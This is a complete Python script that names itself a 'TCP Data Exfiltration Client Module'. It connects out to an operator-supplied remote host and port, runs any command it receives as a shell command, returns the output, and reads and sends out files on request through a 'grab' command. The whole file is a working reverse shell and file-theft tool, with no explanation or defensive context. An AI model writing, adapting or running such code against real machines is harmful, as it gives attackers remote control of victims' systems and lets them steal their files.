#!/usr/bin/env python3

import subprocess
import socket
import os

def Transfer(sock,path):
    #
    if(os.path.exists(path)):
        #
        f = open(path,'rb')
        #
        packet = f.read(1024)
        #
        while(len(packet) > 0):
            #
            sock.send(packet)
            #
            packet = f.read(1024)
            #
        sock.send('DONE'.encode())
        #
    else:
        #
        sock.send('[!] File not found '.encode())

def Connecting(addr,port):
    #
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    #
    print("[*] Connecting to: %s:%s " % (addr,port))
    #
    s.connect((addr,port))
    #
    while(True):
        #
        command = s.recv(1024)
        #
        if('terminate' in command.decode()):
            #
            s.close()
            #
            break
            #
        elif('grab' in command.decode()):
            #
            grab,path = command.decode().split("*")
            #
            try:
                Transfer(s,path)
            except:
                pass
        else:
            #
            CMD = subprocess.Popen(command.decode(),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            #
            s.send(CMD.stderr.read())
            #
            s.send(CMD.stdout.read())

def main():
    #
    print("[*] TCP Data Exfiltration Client Module [*]")
    #
    addr = input("[+] Enter the RHOST address-> ")
    #
    port = int(input("[+] Enter the RHOST port-> "))
    #
    # print("[*] Connecting to: %s:%s " % (addr,port))
    #
    Connecting(addr,port)


if(__name__ == '__main__'):
    #
    main()
